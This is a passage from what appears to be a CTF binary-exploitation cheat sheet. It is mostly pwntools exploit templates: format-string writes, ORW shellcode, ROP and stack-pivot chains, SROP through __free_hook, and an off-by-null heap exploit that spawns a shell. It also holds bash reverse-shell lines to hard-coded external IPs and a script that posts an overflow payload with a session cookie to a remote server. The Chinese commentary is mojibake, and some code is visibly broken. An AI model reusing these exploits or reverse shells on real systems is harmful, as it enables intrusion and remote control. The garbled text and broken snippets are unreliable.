hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

buf = 0x804A060+0x4
shellcode = asm(shellcraft.i386.linux.sh())

sl("%6$p")
ru("0x")
stack = int(p.recv(8),16)
lg('stack')
ret = stack-0xc

pay = '%' + str(ret & 0xff) + 'c%6$hhn'
pay = pay.ljust(200,'\x00')
s(pay)

pay = '%' + str(buf & 0xffff) + 'c%10$hn'
pay = pay.ljust(200,'\x00')
s(pay)

pay = 'quit' + shellcode
s(pay)

ia()
```







## orw

### gadget

è¿™ç§ä¼˜å…ˆçº§æœ€é«˜ï¼Œè¦å…ˆè¿ç§»åˆ°bssæ®µä¸Š(æœ¬åœ°æ‰“åœ¨å½“å‰ç›®å½•å»ºä¸€ä¸ªflag)

```python
shellcode = asm(
'''
    mov eax, 0x67616c66 ;// flag
    push rax

    mov rdi, rsp
    xor eax, eax
    mov esi, eax
    mov al, 2
    syscall ;// open

    push rax
    mov rsi, rsp
    xor eax, eax
    mov edx, eax
    inc eax
    mov edi, eax
    mov dl, 8
    syscall ;// write open() return value

    pop rax
    test rax, rax
    js over

    mov edi, eax
    mov rsi, rsp
    mov edx, 0x01010201
    sub edx, 0x01010101
    xor eax, eax
    syscall ;// read

    mov edx, eax
    mov rsi, rsp
    xor eax, eax
    inc eax
    mov edi, eax
    syscall ;// write

over:
    xor edi, edi
    mov eax, 0x010101e8
    sub eax, 0x01010101
    syscall ;// exit
'''
)
pay = (#cyclic(64)# + flat(
[
    #0, 
    pop_rdi, 0x601000, 
    pop_rsi, 0x2000, 
    pop_rdx, 7,
    mprotect,
    jmp_rsp
]) + shellcode).ljust(0x100, b'\0')


```



ä¸‹è¾¹2ç§é€šå¸¸éœ€è¦è°ƒæ•´gadgetï¼Œè€Œä¸”è¿˜éœ€è¦æ‰¾ä¸ªåœ°æ–¹å†™å…¥/flag

```python
pay = p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(syscall)
pay += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x100)+p64(pop_rdx)+p64(0x30)+p64(Read)
pay += p64(pop_rdi)+p64(1)+p64(Write)
```



Open->openat å¯èƒ½ä¼šä¸å¯ç”¨

```python
pay = p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(Open)
pay += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x100)+p64(pop_rdx)+p64(0x30)+p64(Read)
pay += p64(pop_rdi)+p64(1)+p64(Write)
```



orw-shellcode æ±‡ç¼–

```python
nop #1å­—èŠ‚
pop rdi # 1å­—èŠ‚
xor esi, esi #2å­—èŠ‚
xor rsi, rsi #3å­—èŠ‚
sub rsp, 0x30 #4å­—èŠ‚
jmp rsp #2å­—èŠ‚
mov rax, 0 #7å­—èŠ‚ 
mov eax, 0 #5å­—èŠ‚
syscall #2å­—èŠ‚
```

### æ ˆè¿ç§»/orw_shellcode

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
p = process("./heap2019")
elf = ELF("./heap2019")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
# context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0','--title', 'gdb', 'bash', '-c']
context.terminal = ['tmux', 'splitw', '-hp','60']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

pop_rdi = 0x0000000000401393
pop_rsi = 0x0000000000401391
ret = 0x000000000040101a

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

read = 0x4012CF
main = 0x4012C0
bss = 0x404200
#-------------------æ³„éœ²libc-------------------------
# å¦‚æœä¸€ç‚¹éƒ½ä¸å¤Ÿå°±ç›´æ¥æ ˆè¿ç§»ï¼Œæ³„éœ²ä»¥åå†ç»§ç»­æ ˆè¿ç§»
ru("before you try to solve this task.")
pay = 'a'*0x100+p64(bss)+p64(read)
s(pay)
pay = 'a'*0x100+p64(bss+0x100)+p64(read)
s(pay)
pay = p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
s(pay)

# å¦‚æœæœ‰ä¸€å®šç©ºé—´ï¼ˆ>=0x20ï¼‰å¯å®ç°æ ˆè¿ç§»
pay = 'a'*0x20+p64(bss)+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(read)
s(pay)
pay = 'a'*0x20+p64(bss+0x20)+p64(read)
s(pay)# åç»­å°±å¯ä»¥orwæˆ–è€…mprotectæ”¹æƒé™


# å¦‚æœä»…æœ‰readå‡½æ•°çš„æƒ…å†µ



libc_base = l64()-0x
lg('libc_base')
pop_rdx = libc_base + 0x0000000000142c92
jmp_rsp = libc_base+0x0000000000002b25
Open = libc_base+libc.sym['open']
Read = libc_base+libc.sym['read']
Write = libc_base+libc.sym['write']
# äºŒé€‰ä¸€
# mprotect = libc_base + libc.sym['mprotect']
# syscall = libc_base + 0xd2625

flag = 'flag'
pay = p64(0)+p64(pop_rdi)+p64(bss-0x500)
pay += p64(pop_rsi)+p64(0x1000)
pay += p64(pop_rdx)+p64(7)
pay += p64(pop_rax)+p64(10)
pay += p64(syscall)
pay += p64(jmp_rsp)
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (bss+0x100))# read(0,rsi,0x100);jmp rsi
ru("let me guess\n")
s(payload)

# å¯ç”¨çš„shellcode
# get flagname
pay = asm(shellcraft.open('./'))
pay += asm(shellcraft.getdents64(3, bss+0x300, 0x100))
pay += asm(shellcraft.write(1, bss+0x300, 0x100))
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (main))# ç­‰ä»·äºcall main
s(pay)
ru("flag")
flagname='flag'+p.recv(20)
print(flagname)

# cat flag 1
flag = 'flag'
pay = asm(shellcraft.cat(flag))
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (bss+0x100))# read(0,rsi,0x100);jmp rsi
s(pay)
# cat flag 2
pay += asm(shellcraft.open((flagname)))
pay += asm(shellcraft.read(3, bss+0x700, 0x400)) # pay += shellcraft.read(3,'rsp',0x100)
pay += asm(shellcraft.write(1,bss+0x700, 0x400)) # pay += shellcraft.write(1,'rsp',0x100)
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (main))
s(pay)

#--------------------ç›´æ¥orw----------------------
flag = 0x404200
pay = 'flag'.ljust(8,'\x00')+p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)*2+p64(pop_rdx)+p64(0)+p64(Open)
pay += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x404200)+p64(0)+p64(pop_rdx)+p64(0x30)+p64(Read)
pay += p64(pop_rdi)+p64(1)+p64(Write)
sl(pay)

ia()
```

### orwæ¶‰åŠåˆ°å †ï¼Œå°±éœ€è¦sropæ¥free_hookæ®µæ”¹æƒé™å®ç°orw

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
p = process("./heap2019")
elf = ELF("./heap2019")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
# context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0','--title', 'gdb', 'bash', '-c']
context.terminal = ['tmux', 'splitw', '-hp','60']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(size):
    sla("4.show\n",'1')
    sla("Size of Heap : \n",size)

def dele(idx):
    sla("4.show\n",'2')
    sla("Index :\n",idx)

def edit(idx,size,con):
    sla("4.show\n",'3')
    sla("Index :\n",idx)
    sla("Size of Heap : \n",size)
    sa("Content of heap : \n",con)
def show(idx):
    sla("4.show\n",'4')
    sla("Index :\n",idx)

#------------------------æ³„éœ²libc------------------------------
# å †çš„æ€è·¯æ¯”è¾ƒå¤æ‚,é¦–å…ˆåˆ©ç”¨æ¼æ´ç‚¹æ³„éœ²libc
pop_rdi = libc_base+libc.search(asm("pop rdi\nret")).next()
pop_rsi = libc_base+libc.search(asm("pop rsi\nret")).next()
pop_rdx = libc_base+libc.search(asm("pop rdx\nret")).next()
pop_rax = libc_base+libc.search(asm("pop rax\nret")).next()
jmp_rsp = libc_base+libc.search(asm("jmp rsp")).next()
syscall = libc_base+libc.search(asm("syscall\nret")).next()
mprotect = libc_base + libc.sym['mprotect']

# mov rax, dword ptr [rdi + 0x20]; mov rbp, rdi;test rax, rax; je 0x34fe3; call rax;è·³è½¬è‡³rdi+0x20
gadget = libc_base+0x0000000000034fd5
free_hook_base = (libc_base+libc.sym["__free_hook"]) & 0xfffffffffffff000
pop3_ret = libc_base+0x00000000000e6ce5
leave_ret = libc_base+0x000000000005a9a8
pop_rsp = libc_base+0x000000000002709c
# åŠ«æŒfree_hook-0xa0,å†™å…¥
pay  = p64(0)+p64(pop3_ret)+p64(0)*2+p64(leave_ret)#<-å¼€å§‹æ‰§è¡Œ
pay += p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(free_hook_base)
pay += p64(pop_rdx_r12)+p64(0x1000)*2+p64(pop_rax)+p64(0)
pay += p64(syscall)# read
pay += p64(pop_rsp)+p64(free_hook_base)# jmp rsp
pay  = payload.ljust(0xa0,"\x00")
# print len(pay)
pay += p64(gadget)
sla(">>",pay)

pay = p64(pop_rdi)+p64(free_hook_base)+p64(pop_rsi)+p64(0x2000)# mprotectæ”¹free_hookæ®µçš„æƒé™æ‰§è¡Œshellcode
pay += p64(pop_rdx_r12)+p64(7)+p64(7)+p64(pop_rax)+p64(10)+p64(syscall)+p64(free_hook_base+0x70)
sc  = shellcraft.open("flag");
sc += shellcraft.read(3,free_hook_base+0x300,0x100)
sc += shellcraft.write(1,free_hook_base+0x300,0x100)

sl(pay.ljust(0x70,"\x00")+asm(sc))
#--------------------------------------------------------------
# mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; SROP+setcontext
gadget = libc_base+0x0000000000034fd5
free_hook_base = (libc_base+libc.sym["__free_hook"]) & 0xfffffffffffff000
setcontext = libc_base+libc.sym['setcontext']+61
frame = SigreturnFrame()# è¿™ä¸ªæ¡†æ¶çš„åœ°å€è¦èµ‹ç»™rdx
frame.rsp = libc_base + libc.sym['__free_hook']+0x10# 2
frame.rdi = free_hook_base
frame.rsi = 0x1000
frame.rdx = 7
frame.rip = libc_base + libc.sym['mprotect']# 1

# åŠ«æŒåˆ°free_hook-0x150,å†™å…¥
frame_addr = libc_base+libc.sym["__free_hook"]-0x150+0x10
pay = p64(0)+p64(frame_addr)+p64(0)*4+p64(setcontext)+str(frame)[0x28:]# 0x28æ­£å¥½è¡¥é½å³ä»+0x10å¼€å§‹
pay = payload.ljust(0x150,'\x00')
pay += p64(gadget)
pay += p64(0)+p64(libc_base+libc.sym["__free_hook"]+0x18)#2
pay += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (free_hook_base))
sla(">>",pay)

dele(free_hook-0x150)# *
# orw
sc = asm(shellcraft.cat('flag'))
sc += asm('''
        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
        ''' % (free_hook_base+0x100))
s(sc)
ia()
```



## Pwn with Web ğŸ’»

```python
# åˆ›å»ºåå‘ shell ï¼Œå¹¶å°†å…¶è¾“å…¥å’Œè¾“å‡ºéƒ½é‡å®šå‘åˆ°ä¸€ä¸ªè¿œç¨‹æœåŠ¡å™¨
cmd = 'bash -c "bash -i >& /dev/tcp/39.102.55.191/9999 0>&1"\x00'
sh -c "sh -i >& /dev/tcp/150.158.144.112/1234 0>&1"\x00
# nc -lvvp 1234
```

å‘åŒ…

```python
from pwn import *
import requests

cookies = {
    'session': 'eyJ1c2VybmFtZSI6Ims0bjk2NiJ9.ZI_LbQ.56KQg3j3spZksRCrTnhkoOu3238',
}

headers = {
    'Accept': '*/*',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Cache-Control': 'max-age=0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://94.74.101.210:50644',
    'Proxy-Connection': 'keep-alive',
    'Referer': 'http://94.74.101.210:50644/',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
}


vip = 0x401129
main = 0x400FF9
payload = b'a'.ljust(0xe8,b'a') + p64(vip) + p64(main)

response = requests.post('http://94.74.101.210:50644/vip.cgi', headers=headers, cookies=cookies, data=payload, verify=False)


print(response.text)
```

å¢åŠ æœ¬åœ°è®¿é—®

```http
Client-Ip: 127.0.0.1
X-Forwarded-For: 127.0.0.1
```











## Pwn witch åè®®ğŸ¤
### Protobuf


```
//ctf.proto


syntax = "proto2";

package ctf;

message pwn {
    optional bytes username = 1;
    optional bytes password = 2;
}
```





```shell
// protoc --python_out=./ ./ctf.proto
// ctf.proto        to      ctf_pb2.py

# -*- coding: utf-8 -*-
# Generated by the protocol buffer compiler.  DO NOT EDIT!
# source: ctf.proto
"""Generated protocol buffer code."""
from google.protobuf import descriptor as _descriptor
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import symbol_database as _symbol_database
from google.protobuf.internal import builder as _builder
# @@protoc_insertion_point(imports)

_sym_db = _symbol_database.Default()




DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\tctf.proto\x12\x03\x63tf\")\n\x03pwn\x12\x10\n\x08username\x18\x01 \x01(\x0c\x12\x10\n\x08password\x18\x02 \x01(\x0c')

_globals = globals()
_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _globals)
_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'ctf_pb2', _globals)
if _descriptor._USE_C_DESCRIPTORS == False:

  DESCRIPTOR._options = None
  _globals['_PWN']._serialized_start=18
  _globals['_PWN']._serialized_end=59
# @@protoc_insertion_point(module_scope)




```





## å †é£æ°´è‰ºæœ¯ğŸ¨

### é“¾å¼å †å—

è¿™é‡Œä¸»è¦æŒ‡çš„æ˜¯ä»¥é“¾è¡¨å½¢å¼ç®¡ç†çš„å †å—ç»“æ„
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231127155812.png)
ä½†å®é™…æƒ…å†µä¼šæ›´å¤æ‚ï¼Œå› ä¸ºä¼šæœ‰çš„ç”³è¯·å¤šä¸ªé™„å±å †å—ï¼Œä¸€èˆ¬æ¥è¯´éƒ½æ˜¯å¯ä»¥showé™„å±å †å—çš„å†…å®¹ï¼Œæ‰€ä»¥æ ¸å¿ƒæŠ€å·§å°±æ˜¯åŠ«æŒ0x50å †å—




### stdoutåŠ«æŒæ³„éœ²

```python
flat([0x00000000fbad3887,0,0,0,environ_libc,environ_libc+8,environ_libc+8,environ_libc+8])
```



### offbynull

**é«˜ç‰ˆæœ¬è¦å †åœ°å€çš„ï¼Œæœ‰å°±ç®€å•ï¼Œæ²¡æœ‰å°±éœ€è¦èƒ½ç”³è¯·å°sizeçš„å †å—åšå †å **

**æ²¡æœ‰editçš„æƒ…å†µï¼Œå‚è€ƒä¸‹è¾¹çš„è®°å½•**

åˆ©ç”¨å †çš„åˆå¹¶æœºåˆ¶ï¼Œå½“æ£€æµ‹åˆ°å­˜åœ¨prevsizeä½ï¼Œå½“å‰å †å—prechunk_size_inuseä½ä¸º0ï¼ˆè¿™é‡Œæ³¨æ„sizeçš„å¤„ç†ï¼Œ0xf8ï¼ˆ0x100ï¼‰çš„å †å—ï¼Œä¼šè¢«æ ‡è®°ä¸º0x101ï¼Œè€Œoffbynulä¼šä½¿å…¶ä¸º0x100ï¼Œè¿™æ ·æ˜¯ä¸æ”¹å˜sizeå¤§å°çš„ï¼Œä¸ç„¶ä¼šå¯¼è‡´sizeå¤§å°çš„æ”¹å˜ï¼‰ï¼Œä¸”prevsizeä½\==ä¸Šä¸ªå †å—çš„sizeä½ï¼Œfreeçš„æ—¶å€™å°±é¡ºä¾¿åˆå¹¶ä¸Šä¸€ä¸ªå †å—ã€‚é«˜ç‰ˆæœ¬ï¼Œå¤šä¸€ä¸ªcheck

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/26177342-3385e98bb1814af0.png)

å¯ä»¥ç›´æ¥è®¾ç½®ä¸Šä¸€ä¸ªå †å—çš„fdå’Œbkéƒ½ä¸ºå®ƒè‡ªå·±(head)æ¥ç»•è¿‡

å¯ä»¥ç”¨æ¥æ„é€ å †å 

```
a  
	è®¾ç½®prevsizeï¼Œé¡ºä¾¿offbynull
b	freeè¿™ä¸ªå †å—

c
```

å†ç”³è¯·å‡ºæ¥å°±æœ‰libcäº†(mainarena+96ï¼Œè¿™ä¸ªåœ°å€é€šå¸¸ä½ä½ä¸º\0)

åç»­åå¤ç”³è¯·å›æ¥åˆ©ç”¨è¿™ä¸ªå †å ç»“æ„åŠ«æŒtcacheå®ç°ä»»æ„åœ°å€ç”³è¯·



å¦‚æœæ²¡æœ‰åœ°å€éœ€è¦ä¾é offbynullæ³„éœ²åœ°å€ï¼Œå°±ç¨å¾®éº»çƒ¦ä¸€ç‚¹

éœ€è¦å‡ ä¸ªæ¡ä»¶ï¼š

* èƒ½ç”³è¯·0x20ï¼Œæœ€åå †å åˆ‡å‰²éœ€è¦ä¸€ä¸ªæœ€å°sizeçš„å †

```python
from pwn import *
context.log_level = 'debug'

s       = lambda data               :p.send(data)
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(data)
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

p = process("bornote")
elf = ELF('bornote')
libc = elf.libc

def cmd(choice):
	sla("aaa's cmd: ",choice)

def add(size):
	cmd(1)
	sla('Size: ',size)

def edit(idx,content):
	cmd(3)
	sla('Index: ',idx)
	p.sendlineafter('Note: ',content)

def show(idx):
	cmd(4)
	sla('Index: ',idx)

def delete(idx):
	cmd(2)
	sla('Index: ',idx)

def dbg():
	gdb.attach(p)
	pause()
fakechunk = 0x00005561306c6f00
sla('username: ','aaa')


# è¿™é‡Œsizeæœ€å¤§æœ€å¥½åˆ«è¶…è¿‡0x440ï¼Œä¸ç„¶æ”¾è¿›largebinæ—¶/ä¸åœ¨åŒä¸€ä¸ªåŒºé—´ä¸Š
add(0x418) # 0 
add(0x128) # 1 # æœ€åç»•è¿‡tcacheä¸ªæ•°æ£€æµ‹ï¼Œå’Œæœ€ååˆ©ç”¨å †å¤ç”¨çš„chunkä¸€æ ·å¤§
add(0x418) # 2
add(0x438) # 3 
add(0x148) # 4
add(0x428) # 5 
add(0x138) # 6

# fakechunk ç²˜fdå’Œbk
delete(0)
delete(3)
delete(5)

#è®¾ç½®fakechunk sizeä½
delete(2) 
add(0x438)  # 0 
edit(0,'a' * 0x418 + p64(0xb01)[:7])
add(0x418)  # 2 
add(0x428)  # 3 
add(0x418)  # 5 

# è®¾ç½®bk
delete(5)
delete(2)
add(0x418)  # 2 
edit(2,p64(0))
add(0x418)  # 5 

# è®¾ç½®fd
delete(5)
delete(3)
add(0x5f8)# 3 # ç½®å…¥largebin
add(0x428)# 5
edit(5,'')
add(0x418)# 7
add(0xf8)# 8

# è®¾ç½®prevsize
edit(6,'a'*0x130+p64(0xb00))
delete(3)

add(0x10)# 3
show(7)
p.recvuntil("Note: ")
libc_base = u64(p.recv(6).ljust(8,'\x00'))- 0x1EBBE0
lg('libc_base',libc_base)
sys = libc_base + libc.sym["system"]
free_hook = libc_base + libc.sym["__free_hook"]
add(0x128)#9
delete(1)
delete(9)
edit(7,p64(free_hook))
add(0x128)# 1
add(0x128)# 9
edit(1,"/bin/sh\x00")
edit(9,p64(sys))
delete(1)

p.interactive()

# æ— edit

read_channel(0x138,'1')# 9
dele(9)
dele(6)
read_channel(0x8f0,'1'*(0x860*8)+bin(free_hook)[2:][::-1])#6
read_channel(0x138,bin(0x68732f6e69622f)[2:][::-1])#9
read_channel(0x138,bin(system)[2:][::-1])#10
dele(9)

```



















å¦‚æœeditå’Œshowçš„æ˜¯åŒä¸€ä¸ªå †å—->å¯è¢«ç”¨æ¥ä¼ªé€ çš„ä½ç½® ï¼Ÿ

showèƒ½è¾“å‡ºå †å—å†…å®¹->è¾“å‡ºunsortbinå°šå­˜çš„libcåœ°å€ **å¸¸è§„**

malloc_sizeæ— é™åˆ¶->èƒ½ç”³è¯·åˆ°ä¸€ä¸ªlibcåœ°å€

freeæœªç½®ç©º(UAF)

æº¢å‡ºç¼–è¾‘(UAF)

ä»»æ„libcåœ°å€å†™å€¼(æ— è¦æ±‚)->IO_list_all/global_max_fast

ä¸‹æ ‡è¶Šç•Œ->æ•°ç»„ä¸‹æ ‡ä¸èƒ½ä¸ºintå’Œcharç±»å‹ï¼

â€‹             ->æ­£å‘è¶Šç•Œï¼Œeditè¶Šç•Œå¯¼è‡´å¯ä»¥ä¿®æ”¹ä¸‹ä¸€ä¸ªsize(è¾“å…¥åç¼ºå°‘è¾¹ç•Œæ ¡éªŒ)

åµŒå¥—ç»“æ„->showå¤–å±‚â€œå§“åâ€ï¼Œâ€œå§“åâ€è¿æ¥åˆ°å †å—åœ°å€

â€‹             ->ç›´æ¥æ‰§è¡Œåœ°å€->è°ƒç”¨printf_gotè¡¨è¦†å†™

åœ¨è°ƒç”¨ pool_alloc å‡½æ•°æ—¶ä½¿ç”¨ 32 ä½æ•°å€¼ + 1 æ‹“å±•æˆ 64 ä½çš„æ–¹æ³•ï¼Œè¿™é‡Œå­˜åœ¨æ•´æ•°æº¢å‡º

å°†å †æº¢å‡ºè½¬æ¢æˆ ROPï¼Œæ§åˆ¶å¯„å­˜å™¨æ ˆè¿ç§»



é¦–å…ˆè¦å¯¹åŠŸèƒ½è¶³å¤Ÿ**ç†Ÿæ‚‰**ï¼Œéœ€è¦æ—¶é—´ï¼Œ**è§¦å‘æ¼æ´ç‚¹**ï¼Œæ³„éœ²åœ°å€

æ€ä¹ˆç†Ÿæ‚‰ï¼Œæ”¹å˜é‡åï¼Œè¾¹ç†Ÿè¾¹æ‰¾ï¼Œè§¦å‘æ¼æ´ç‚¹æ˜¯å…³é”®ä¸­çš„å…³é”®

å¾€å¾€å°±èƒ½å®ç°æ³„éœ²ï¼Œ**ç»“åˆç»“æœå’Œæ¼æ´ç‚¹**



æ³„éœ²libcä»¥åä¸€é“é¢˜å°±å®Œæˆäº†ç™¾åˆ†ä¹‹60

å‰©ä¸‹éƒ¨åˆ†å¾€å¾€å°±æ˜¯é‡å¤ä¸€éæ³„éœ²çš„æ‰“æ³•ï¼Œæ¯”å¦‚tcacha poison





è¦å¯¹glibcçš„**å †ç®¡ç†æœºåˆ¶**çš„æ¼æ´ç‚¹è¶³å¤Ÿç†Ÿæ‚‰

double free çš„ä¸åŒç‰ˆæœ¬

malloc_consolidate

offbyone and offfbynull   å…¶ä¸­ä¼ªé€ çš„å¸ƒå±€ï¼Œ**ä¸åŒç‰ˆæœ¬åˆæ˜¯å¦‚ä½•check**

house of botake

**å¸¸è§çš„check**



è§¦å‘æ¼æ´ç‚¹åè¦å»¶å±•ï¼Œæ¼æ´å»¶å±•ï¼Œè¾¾åˆ°ç›®çš„



åˆ‡å‰²unsortbinï¼ŒUAFï¼Œè¦å»æƒ³ï¼Œæ€ä¹ˆæ‰èƒ½å®ç°æˆ‘ä»¬çš„ç›®çš„ï¼Œç›®çš„å¯¼å‘



å¸¸è§çš„ç›®çš„



æ„é€ ä¸€ä¸ªunsortbinå’Œtcachebinæˆ–è€…fastbinçš„åŒæŒ‡é’ˆï¼Œä¿®æ”¹ä¸€ä¸ªå®Œæˆå¯¹å¦ä¸€ä¸ªçš„æ“ä½œ



æ”¾ç½®è¿›unsortbinï¼Œæ“ä½œçš„ç©ºé—´å°±å˜å¤šäº†ï¼Œhouse of botake



tcacheæ¯”fastbinå¥½ç”³è¯·ï¼Œtcacheåªæœ‰7ä¸ªï¼ŒunsortBinæœ‰å¾ˆå¤šä¸ª



å †å çš„æ¦‚å¿µï¼Œä¸Šä¸‹åˆå¹¶æœ¬è´¨ä¸Šæ˜¯å¤§åŒ…å°çš„é—®é¢˜ï¼Œä¹Ÿå­˜åœ¨å°è¡¨å¤§çš„æƒ…å†µï¼Œ2ä¸ªä¸€æ ·çš„æŒ‡é’ˆæŒ‡å‘2ä¸ªå †è¿™å«å †å 



ä¸€ä¸ªå®Œæ•´çš„expæ˜¯æ°´åˆ°æ¸ æˆçš„



å…³äºå †åˆ†æ°´ï¼Œå¾ˆå¤šäººè¯´çš„double free UAF unlink tcacha poison



ä¸åŒsizeçš„å †å—ï¼Œæƒ³åˆ°åˆ‡å‰²ï¼Œæƒ³åˆ°å †å 





å¸¸è§„çš„doublefree

tcacheçš„doublefreeä¸»è¦ç”±bkæ§åˆ¶

fastbinä¸»è¦é€šè¿‡ç›¸åº”sizebinçš„å¤´èŠ‚ç‚¹å †å—æ¥æ£€éªŒ







00çš„å½¢å¼ï¼Œfastbinä¸æ”¯æŒï¼Œtcache

010çš„å½¢å¼ï¼Œfastbinæ˜¯æ”¯æŒçš„ï¼Œtcacheä¸€ç›´éƒ½ä¸æ”¯æŒ









 

æ‰“æ–­ç‚¹çš„æ„ä¹‰

1.çœ‹å¯„å­˜å™¨çš„å–å€¼å˜åŒ–

2.çœ‹å‡½æ•°çš„å®é™…ä¼ å‚

### realloc_hook è°ƒæ•´æ ˆå¸§

åŠ«æŒmallocä¸º

```python
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['realloc']
realloc_hook = libc_base + libc.sym['__realloc_hook']
one = libc_base + 0x4527a


edit(1,0x10,p64(malloc_hook-0x23))
add(0x68,'a')# 3
add(0x68,'a'*0xb+p64(one)+p64(realloc+xxx))# æ‰‹åŠ¨è°ƒæ•´
```



### 0xffå†…size UAF

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
